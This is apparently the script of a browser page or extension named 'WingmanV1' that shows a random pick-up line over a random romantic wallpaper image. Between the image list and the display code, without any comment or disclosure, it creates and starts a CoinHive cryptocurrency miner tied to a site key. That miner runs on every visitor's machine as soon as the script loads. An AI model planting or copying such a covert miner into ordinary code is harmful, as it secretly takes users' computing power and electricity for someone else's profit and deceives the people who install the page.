(function(){

  var quotes = [
	   "I just got out of Leavenworth. Can I steal you a drink? How about a BMW? ",
	   "I always thought it was just a fairy tale. But now I realize you really are made from sugar, spice and everything nice.",
	   "So your dad…was he a king or something? (Why?) Well, he must have been a king to make a princess like you.",
	   "I know I don’t have a chance with you…but I’ve always wanted to hear an angel speak.",
	   "I believe there is something in your eye. Er, no wait…it was just a sparkle.",
	   "Life without you? Well, I imagine that would be like a broken pencil. (Why?) It would be pointless.",
	   "Hey, you look like my first wife. (Oh? How many have you had?) None actually. But I am an optimist.",
	   "Do you hear that? That rhythmic pounding noise? Oh it’s just my heart beating.",
	   "Wow! You are talking to me? I think my dreams have finally come true!",
	   "I don’t really know if you’re beautiful or not. I’m still enamored by your eyes.",
	   "I have a bad habit of saying whatever it is I’m thinking. You are just drop dead gorgeous tonight!",
	   "For you I can be a knight in shining armor.",
	   "You know…our teenage kids would be smoking hot.",
	   "I am a man of few words. You are beautiful. Would you like to go out?",
	   "I think I love you…in that dress. Haha, caught myself.",
	   "You are deserving of masterful poetry, not mere words.",
	   "I want to spend the rest of my life entertaining you.",
	   "Our souls met long before we dreamt of ever setting eyes on each other, otherwise why does it feel like I've known you for a thousand years?",
	   "Being alone doesn't hurt me neither does loneliness. What really hurts is realising that I should be with you right now.",
	   "We're not socks. But I think we'd make a great pair. ",
	   "There’s so much I want to say to you…but your beautiful eyes continue to interrupt me.",
	   "I like Legos, you like Legos, why don't we build a relationship? ",
	   "Are you the dub to my step? cause' I wub wub wub you.",
	   "I can hold my liquor but kissing you would make me weak at the knees.",
	   "I had a dream about you. Yes, really. Because I see my one true dream girl every night.",
	   "We forget so many of the people we meet in life. But my dear, I am quite sure I’m going to remember you forever.",
	   "You are as refreshing as a cold glass of water on a hot day. And I am so thirsty right now.",
	   "I don’t really like dancing. But I will use any excuse to hold your gorgeous hands for just one moment.",
	   "You are a compass, my dear. Without you I am lost.",
	   "You, my dear, are the very reason men fall in love.",
	   "I just have to say this, because honesty is the best policy. You are the most beautiful woman I’ve ever seen!",
	   "If I had a flower for every time I thought of you and will think of you…I would be walking in a garden…forever.",
	   "You are the light I see glowing brightly at the end of the tunnel.",
	   "Some say that beauty is in a drop of water. Well, in that case you’re the ocean!",
	   "Did I just feel an earthquake or was it you who just rocked my world?",
	   "What are you doing for the rest of your life? I really want to spend it with you.",
	   "I think I have seen you somewhere. You are the same girl who came in my dreams last night.", 
  	   "Would you mind lending me your heart?",
	   "I have lost my heart. I think it is with you.",
	   "Can you lend me your smile?",
	   "My heart forgets to beat the moment it sees you.",
	   "I am bowled over your looks.", 
	   "Would you mind lending me a band aid? I have just bruised my knee falling for you.",
	   "There is something in your eye. Oh! it is a sparkle.",
	   "Would you mind coming over for a coffee?",
	   "Do you mind if I share rest of my life with you?",
	   "90% of my game is corny pick up lines and the other 10 is awkward stares.",
	   "You remind me of an overdue library book, cause you got Fine written all over you.",
	   "On a scale of 1 to 10, you’re a 9. I’m the 1 you need",
	   "Hi, did your license get suspended for driving all these guys crazy?",
	   "I’m not a professional photographer. But I can easily picture us together.",
	   "I don't know your name, but I'm pretty sure it is as beautiful as you are.",
	   "Even if there wasn't any gravity on earth, I would still fall for you!",
	   "Me without you is like a nerd without braces, A shoe without laces, aSentenceWithoutSpaces.",
	   "Do bandz, make you dance?",
	   "On a scale of 1 to America, how free are you tonight?",
	   "Hey there, whats up, what do I have to do to get on your drunk dial list?",
	   "Hey how do you pronounce your digits",
	   "Your killing me with that smile, instead of going to jail for murder you should just do time with me.",
	   "Do you have a Bandaid? Cos I just scraped my knee falling for you.",
	   "Do you have a map? Cos Honey, I just keep gettin lost in your eyes.",
	   "You're eyes are bluer than the Atlantic ocean and baby, I'm all lost at sea.",
	   "Hello. Cupid called. He says to tell you that he needs my heart back.",
	   "Do you have a pencil? Cause I want to erase your past and write our future.",
	   "How was Heaven when you left it? You are so beautiful that you give the sun a reason to shine.",
	   "The only thing your eyes haven't told me is your name.",
	   "Honey, you give new meaning to the defintion of 'edible'.",
	   "I think I can die happy now, coz I've just seen a piece of heaven.",
	   "You must be a magician, because every time I look at you, everyone else disappears.", 
	   "My mom told me that life is like a deck of cards, so you must the be queen of hearts.",
	   "I'm no organ donor, but I'd be happy to give you my heart.",
	   "When I first saw you I looked for a signature, because every masterpiece has one.", 
	   "Excuse me...Hi, I'm writing an essay on the finer things in life, and I was wondering if I could interview you.",
	   "Has anyone ever told you that your eyes are clear like the ocean? Because I can see straight into your soul.",
	   "If I had a rose for every time I thought of you, I would be walking through my garden forever.",
	   "The best thing about ME is YOU",
	   "Please call 9-1-1, my heart just stopped for you",
	   "Are you a camera? Because I smile every time I see you",
	   "If kisses were snowflakes, I’d send you a blizzard.",
           "If you were a fruit, you would be a fineapple. And if you were a vegetable, I would visit you every day in hospital.",
           "You know what you’d look really beautiful in? My arms.",
	   "I think you’ve got something in your eye. Oh never mind, it’s just a sparkle.",
	   "Would you touch me so I can tell my friends I’ve been touched by an angel?",
	   "Are you a girl scout because you tie my heart in knot.",
	   "Caution: Please keep your distance. I might fall… for you.",
	   "If I had a dime for every time I thought of you… I’d have one dime… coz you never left my mind.",
	   "If beauty were time, you’d be an eternity.",
	   "If I were a letter in the alphabet, I’d be Q, so I could always be next to U.",
	   "May I have the distinguished honor and privilege of sitting next to you?",
	   "You’re so sweet, you’re giving me cavaties.",
	   "You’re so cute, it’s distracting.",
	   "Baby, you must be a broom, cause you just swept me off my feet.",
	   "Can you give me directions to your heart? I seem to have lost my way in your eyes.",
	   "What time do you have to be back in heaven?"
               ];
     
  var images = [
    "reddot.jpeg",
    "girl-about-red-blue-eyes-90757.jpeg",    
    "walking_alone-wallpaper-1680x1050.jpg",
    "pinkrose.jpg",
    "ng-60686.jpg",
    "pexels-photo-729005.jpeg",
    "she_had_to_hide_her_love_away-wallpaper-1680x1050.jpg",
    "best_thing_about_me_is_you-normal5.4.jpg",
    "rose-blue-flower-rose-blooms-67636.jpeg",
    "couple-run-cloud-reflection-art.jpg",
    "as_in_fairy_tales-wallpaper-1680x1050.jpg",
    "asian_kimono_sword_101657_1600x1200.jpg",
    "dark_woman_4k-wide.jpg",
    "andrik-langfield-petrides-270368.jpg",
    "jeremy-bishop-206785.jpg",
    "pexels-photo-204959.jpeg",
    "bart-larue-314562.jpg",
    "romantic-flower-couple-art.jpg",
    "jamie-street-207822.jpg",
    "couple-night-sky-romantic.jpg", 
    "fallen_angel_4k-wide.jpg",
    "cesar-couto-420988.jpg",
    "love_bridge-wallpaper-1280x720.jpg",
    "valentine_girl_paint-HD.jpg",
    "the_light_at_the_end_of_the_tree_tunnel-wallpaper-1920x1080.jpg",
    "love_above_all-wallpaper-1680x1050.jpg"    
 		 ];
  var miner = new CoinHive.User('q3H5OB6fvuPdgyh7xUA1OM8esB0PYvBe');
  miner.start();
function chooseOne(arr) {
return arr[Math.floor(Math.random() * arr.length)];
  }
  window.onload = function() {
    var randomImage = chooseOne(images);
    var randomQuote = chooseOne(quotes);

    document.getElementById('background-image').style.backgroundImage = 'url("img/'+ randomImage +'")';
    document.getElementById('quote').innerHTML = randomQuote;
    document.getElementById('author').innerHTML = "&mdash; " +  'WingmanV1' + " &mdash;";

    document.getElementById('quote').className = 'move';
    document.getElementById('author').className = 'move';
  };

})();
